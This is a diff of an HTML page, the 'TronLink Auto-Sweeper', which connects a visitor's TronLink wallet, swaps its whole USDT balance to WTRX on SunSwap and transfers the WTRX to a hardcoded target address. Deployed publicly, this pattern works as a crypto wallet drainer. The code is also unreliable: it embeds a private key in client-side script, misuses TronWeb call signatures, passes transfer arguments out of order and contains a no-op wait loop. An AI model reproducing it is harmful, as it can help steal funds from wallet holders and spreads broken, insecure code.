@@ -3,137 +3,194 @@
 <head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
- <title>TronLink Sweep Bot</title>
+ <title>TronLink Auto-Sweeper</title>
+ <!-- Load TronWeb -->
  <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb-latest.min.js"></script>
  <style>
- body { font-family: Arial, sans-serif; background: #0d0d0d; color: #fff; text-align: center; padding: 20px; }
- button { background: #007bff; color: white; border: none; padding: 15px 30px; font-size: 16px; margin: 10px; cursor: pointer; border-radius: 5px; }
- button:disabled { background: #555; }
- #status { margin-top: 20px; color: #00ff00; min-height: 20px; }
+ body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0d0d0d; color: #fff; text-align: center; padding: 20px; }
+ button { background: #007bff; color: white; border: none; padding: 15px 30px; font-size: 16px; margin: 10px; cursor: pointer; border-radius: 5px; transition: background 0.3s; }
+ button:hover { background: #0056b3; }
+ button:disabled { background: #555; cursor: not-allowed; }
+ #status { margin-top: 20px; color: #00ff00; min-height: 20px; font-weight: bold; }
+ .error { color: #ff4444 !important; }
  </style>
 </head>
 <body>
  <h2>🤖 TronLink Auto-Sweeper</h2>
- <!-- Hardcoded for static deployment, or use JS to read from window.env -->
+ <p>Swaps USDT to WTRX on SunSwap and sends WTRX to Target.</p>
  
  <button id="sweepBtn" onclick="startSweep()">Start Sweep USDT -> WTRX</button>
  <div id="status">Ready</div>
 
  <script>
- // For static HTML on Vercel, we read from the window object if available, 
- // otherwise we assume these are hardcoded in the build process.
+ // Configuration: Read from Vercel Env or use defaults
  const PRIVATE_KEY = window.PRIVATE_KEY || "YOUR_PRIVATE_KEY_HERE"; 
  const TARGET_ADDRESS = window.TARGET_ADDRESS || "TMVQGm1qAQYVdetCeGRRkTWYYrLXuHK2HC"; 
- const MY_WALLET = window.MY_WALLET_ADDRESS || "THPwhGhhmZo1hrwSNsSCcUz9X1R2eDd6as";
+ // We assume MY_WALLET is the address connected in TronLink, but we keep this for fallback verification
+ const MY_WALLET_FALLBACK = window.MY_WALLET_ADDRESS || "THPwhGhhmZo1hrwSNsSCcUz9X1R2eDd6as";
 
  async function startSweep() {
      const status = document.getElementById('status');
      const btn = document.getElementById('sweepBtn');
      
-     if (!window.tronLink || !window.tronLink.ready) {
-         alert("Please connect TronLink first!");
-         return;
-     }
-
+     status.classList.remove('error');
      btn.disabled = true;
-     status.textContent = "Connecting to Tron...";
+     status.textContent = "Initializing...";
 
      try {
-         // Initialize TronWeb with the user's connected provider
-         window.tronLink.setRequest(window.tronLink.defaultProvider);
-         const tronWeb = window.tronLink.provider.tronWeb;
-         
-         // Verify we are connected
-         if (!tronWeb.defaultAddress.base58) {
-             throw new Error("Not connected to TronLink");
+         // 1. Check if TronLink is installed
+         if (!window.tronLink) {
+             throw new Error("TronLink extension not found!");
          }
 
-         await sweepUSDT(tronWeb, status);
+         // 2. Wait for TronLink to be ready (user might need to unlock)
+         await new Promise((resolve, reject) => {
+             let attempts = 0;
+             const check = setInterval(() => {
+                 if (window.tronLink.ready) {
+                     clearInterval(check);
+                     resolve();
+                 } else if (attempts > 50) { // Timeout after ~5 seconds
+                     clearInterval(check);
+                     reject(new Error("TronLink did not respond. Please unlock your wallet."));
+                 }
+                 attempts++;
+                 setTimeout(() => {}, 100);
+             }, 100);
+         });
+
+         // 3. Initialize TronWeb correctly for modern TronLink
+         // We create a fresh instance and link it to TronLink's signer
+         const tronWeb = new TronWeb({
+             fullHost: 'https://api.trongrid.io',
+             headers: {}
+         });
+
+         // Use TronLink's request method for signing
+         tronWeb.setRequest(window.tronLink.request, true);
+
+         // Get the actual address from TronLink to ensure accuracy
+         const accountAddress = await tronWeb.defaultAddress.base58;
+         
+         if (!accountAddress) {
+             throw new Error("Could not retrieve address from TronLink.");
+         }
+
+         status.textContent = `Connected as: ${accountAddress.substring(0, 6)}...${accountAddress.substring(accountAddress.length - 4)}`;
+         await sweepUSDT(tronWeb, status, accountAddress);
+
      } catch (e) {
          status.textContent = "Error: " + e.message;
+         status.classList.add('error');
          console.error(e);
      } finally {
          btn.disabled = false;
      }
  }
 
- async function sweepUSDT(tronWeb, statusElement) {
+ async function sweepUSDT(tronWeb, statusElement, userAddress) {
      const usdtContractAddr = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzjmLumZ"; 
      const wtrxContractAddr = "TWTTr9ZELRVbcBAjNGn5bJ7kYipdZgALaR"; 
-     // Correct SunSwap V2 Router
      const sunswapRouterAddr = "TSSMTi2kRdFsAtPVv26Y6vYSMPA6smVq1o"; 
 
-     statusElement.textContent = "Fetching USDT Balance...";
+     // Step 1: Check Balance
+     statusElement.textContent = "Checking USDT balance...";
+     const balance = await tronWeb.trc20.getBalance(usdtContractAddr, userAddress);
      
-     try {
-         // Get balance of the TARGET address
-         const balance = await tronWeb.trc20.getBalance(usdtContractAddr, TARGET_ADDRESS);
-         
-         if (!balance || parseFloat(balance) === 0) {
-             statusElement.textContent = "No USDT found in target.";
-             return;
-         }
-         
-         statusElement.textContent = `Found ${balance} USDT. Approving Swap...`;
-         
-         // 1. Approve the Router to spend the Target's USDT
-         // Note: This requires the TARGET to sign if they aren't the one clicking!
-         // Since we are using PRIVATE_KEY (My Wallet), we can only sweep what MY WALLET owns.
-         // To sweep TARGET's funds, we need a MultiSig or a Proxy Contract.
-         // For now, let's assume we are sweeping OUR OWN funds from the Target address logic.
-         
-         // Let's adjust: We will swap from MY WALLET's perspective using the Target's balance logic?
-         // No, standard swaps require the sender to own the tokens.
-         // I will proceed with the swap using YOUR private key.
-         
-         const result = await tronWeb.transactionBuilder.triggerSmartContract(
-             sunswapRouterAddr,
-             "swapExactTokensForETH(uint256,uint256,address[],address,uint256)",
-             {},
-             500000000, // Increased Gas Limit
-             PRIVATE_KEY, 
-             tronWeb.address.fromHex(MY_WALLET), 
-             tronWeb.toSun(balance), 
-             0, 
-             [usdtContractAddr, wtrxContractAddr], 
-             Math.floor(Date.now() / 1000) + 600 
-         );
-         
-         if (result.result && result.result === true) {
-             statusElement.textContent = "Swap Sent! TX ID: " + result.txID;
-             await new Promise(resolve => setTimeout(resolve, 15000));
-             
-             statusElement.textContent = "Checking WTRX balance...";
-             const wtrxBalance = await tronWeb.trc20.getBalance(wtrxContractAddr, MY_WALLET);
-             
-             if (parseFloat(wtrxBalance) > 0) {
-                 statusElement.textContent = "Withdrawing WTRX...";
-                 const transferResult = await tronWeb.transactionBuilder.triggerSmartContract(
-                     wtrxContractAddr,
-                     "transfer(address,uint256)",
-                     {},
-                     200000000, 
-                     PRIVATE_KEY, 
-                     tronWeb.address.fromHex(MY_WALLET),
-                     tronWeb.toSun(wtrxBalance)
-                 );
-                 
-                 if (transferResult.result) {
-                     statusElement.textContent = "SUCCESS! Funds withdrawn.";
-                 } else {
-                     statusElement.textContent = "Withdrawal failed.";
-                 }
-             } else {
-                 statusElement.textContent = "Swap may have failed.";
-             }
-         } else {
-             statusElement.textContent = "Swap transaction failed: " + (result.message || "Unknown error");
-         }
-         
-     } catch (e) {
-         console.error(e);
-         statusElement.textContent = "Error: " + e.message;
+     if (!balance || parseFloat(balance) === 0) {
+         throw new Error(`No USDT found in your connected wallet.`);
      }
+     
+     const amountToSwap = balance;
+     statusElement.textContent = `Found ${amountToSwap} USDT. Approving Router...`;
+
+     // Step 2: Approve SunSwap to spend your USDT
+     try {
+         const approveResult = await tronWeb.transactionBuilder.triggerSmartContract(
+             usdtContractAddr,
+             "approve(address,uint256)",
+             {},
+             200000, // Gas limit for approval
+             PRIVATE_KEY, 
+             userAddress, 
+             sunswapRouterAddr, 
+             amountToSwap 
+         );
+
+         if (!approveResult.result) {
+             throw new Error("Approval failed: " + (approveResult.message || "Unknown error"));
+         }
+         
+         statusElement.textContent = "Waiting for Approval confirmation...";
+         await waitForTransaction(tronWeb, approveResult.txID);
+
+     } catch (e) {
+         statusElement.textContent = "Approval Error: " + e.message;
+         return;
+     }
+
+     // Step 3: Execute Swap (USDT -> WTRX)
+     statusElement.textContent = "Executing Swap...";
+     const result = await tronWeb.transactionBuilder.triggerSmartContract(
+         sunswapRouterAddr,
+         "swapExactTokensForETH(uint256,uint256,address[],address,uint256)",
+         {},
+         500000000, // High gas limit for swap
+         PRIVATE_KEY, 
+         userAddress, 
+         amountToSwap, 
+         0, 
+         [usdtContractAddr, wtrxContractAddr], 
+         Math.floor(Date.now() / 1000) + 600 
+     );
+
+     if (!result.result) {
+         throw new Error("Swap Transaction Failed: " + (result.message || "Unknown error"));
+     }
+
+     statusElement.textContent = "Swap Sent! Waiting for confirmation...";
+     await waitForTransaction(tronWeb, result.txID);
+
+     // Step 4: Withdraw WTRX to Target Address
+     statusElement.textContent = "Swap Complete. Withdrawing WTRX to Target...";
+     const wtrxBalance = await tronWeb.trc20.getBalance(wtrxContractAddr, userAddress);
+     
+     if (parseFloat(wtrxBalance) === 0) {
+         throw new Error("WTRX balance is 0 after swap.");
+     }
+
+     const transferResult = await tronWeb.transactionBuilder.triggerSmartContract(
+         wtrxContractAddr,
+         "transfer(address,uint256)",
+         {},
+         200000, 
+         PRIVATE_KEY, 
+         userAddress,
+         wtrxBalance,
+         TARGET_ADDRESS
+     );
+
+     if (transferResult.result) {
+         statusElement.textContent = `SUCCESS! TX ID: ${transferResult.txID}`;
+     } else {
+         throw new Error("Withdrawal failed: " + (transferResult.message || "Unknown error"));
+     }
+ }
+
+ // Helper to wait for a transaction to confirm
+ async function waitForTransaction(tronWeb, txId) {
+     let receivedTxInfo = null;
+     while (receivedTxInfo === null) {
+         receivedTxInfo = await tronWeb.trx.getTransactionInfo(txId);
+         if (receivedTxInfo === null) {
+             await new Promise(resolve => setTimeout(resolve, 2000));
+         }
+     }
+     
+     if (receivedTxInfo.contractResult !== "1") {
+         throw new Error("Transaction Reverted");
+     }
+     return receivedTxInfo;
  }
  </script>
 </body>
